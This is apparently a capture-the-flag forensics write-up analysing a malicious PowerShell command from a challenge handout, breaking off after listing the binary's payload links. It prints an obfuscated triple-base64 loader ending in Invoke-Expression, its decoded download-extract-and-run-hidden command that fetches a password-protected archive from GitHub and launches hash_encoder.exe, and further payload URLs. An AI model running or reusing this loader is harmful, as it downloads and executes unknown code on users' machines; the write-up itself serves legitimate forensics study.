## Description
The malicious command downloaded and executed a binary. Find out what it did.

Handout is the same as the one used to solve My Clematis.

## Solution

I got this from running `git blame` on the .jpg.ps1 file earlier,
```
$bbbbbbbbbbbbbb="VnpGT05XTXpVbXhpVXpWVldsaG9NRXhyVm5WWk1qbHJZVmMxYmxoVWJ6WldWbEpIVDBNMVNGcFlVbFJrU0Vwd1ltMWpiMWN4VGpWak0xSnNZbE0xUkdJeU5USmFXRW93V0ZSdk5sSnVTblppVlVwb1l6SlZNazVHVGpCamJXeDFXbmxuYmxsVmFGTk5SMDVKVkZSYVRXVlViSFZaVm1oVFlqSlNXRk5ZVmxwTmFtd3dWRVJLTkUxWFJYbFNXRkpQVWpGWmVWa3lhelZrUjFaVVRWaE9hVTB4Y0hOVVJFNUxZVWRTTlU5WWJHRldNWEEyVkVSS2IySkdiRmhWYm5CTlRXcEdiMWxXWXpCa2JVWklUVmhTVFdGdFVUSktlV3R3U1VoM1oxSnRPWGxTVjBacVlVTXhVRmx0Y0d4Wk0xRm5aWGxCYTJSWVNuTkpSREJuU2tZNE4wbERVbXRoV0VsblVGTkJhVXBIVm5Wa2FuQldWVEJXVTFWR1NsQlNhMnhOVWxaNFJXSXpaSFZpUnpsb1draE9ZMkZITVhSWU0xSnNZbGhCYVU5NVFrOWFXR04wVTFoU2JHSlRRWFJUV0ZKc1lsWlNOV05IVldkU1IyeDVXbGRPTUdJelNqVkpRekZSV1ZoU2IwbERVbXRoV0VsblRGVmFkbU50VG14SlNIZG5WRE5XTUV4Vk5URmlSM2MzU1VOU2FHTnRUbTloV0Zwc1NVUXdaMGxwVW10aFdFcGpZVWN4ZEV4cVpEWkphbk5uVTFjMU1tSXlkR3hNVm1Sc1dXeEtiR05ZVm14ak0xRm5URlpXZVdGVFFXdGtXRXB6U1VNeFVHUllVa2RoVjNoc1NVTlNhR050VG05aFdGcHNUM2xCYlVsRFNUTmxhVWxuWlVOQmFVeFlRbTlsV0ZaelpGaGFiMlZZVm5Oa1dGcHZaVmhWYVVsRE1YWkphVkpyWVZoSmFVbERVbWhqYlU1dllWaGFiRWxJZDJkVU0xWXdURlUxTVdKSGR6ZEpSa3BzWWxjNU1scFRNVXBrUjFaMFNVTlNhR050VG05aFdGcHNUM2xDVkdSSFJubGtRekZSWTIwNWFscFlUbnBKUXpGSFlWZDRiRlZIUmpCaFEwRnBTa2RTY0dOc2VHOVpXRTV2V0RKV2RWa3lPV3RhV0VsMVdsaG9iRWxwUVhSV01teDFXa2M1TTFVelVqVmlSMVZuVTBkc2ExcEhWblZKUXpGWVdWZHNNRTk1UWxOYVZ6RjJaRzFWZEZOWVVteGlVMEZyV2tkc2VVbERNVk5hVjA0eFkyNU9iRWxETVVkaU0wcHFXbE5DT1E9PQ=="; for($i=0;$i-lt3;$i++){$bbbbbbbbbbbbbb=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($bbbbbbbbbbbbbb))}; Invoke-Expression $bbbbbbbbbbbbbb
```
Here the payload is encoded thrice in base64, thus decoding this 3 times gave me
```pwsh
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2x1a2EtNGV2ci9teS1sb3ZlL3Jhdy9yZWZzL2hlYWRzL21haW4vaG1tLjd6')) | ForEach-Object { $url = $_; $dir = "$env:USERPROFILE\Downloads\hmm_temp"; New-Item -ItemType Directory -Path $dir -Force | Out-Null; $archive = "$dir\hmm.7z"; Invoke-WebRequest -Uri $url -OutFile $archive; & "7z" x "-phyuluvhyuluvhyu" -o"$dir" $archive | Out-Null; Remove-Item $archive; Start-Process -FilePath "$dir\hash_encoder.exe" -WindowStyle Hidden -Wait; Remove-Item $dir -Recurse -Force }
```

This script downloads a file `hmm.7z` from a repo and then extracts it with the pwd `hyuluvhyuluvhyu` and then runs the file `hash_encoder.exe`.

So i began with decompiling this binary, and got to know it is a rust binary.

It takes payloads from 2 links 
```
https://github.com/luka-4evr/my-heart/raw/refs/heads/main/caret-ware.exe
https://github.com/luka-4evr/my-saviour/raw/refs/heads/main/part2.txt
```
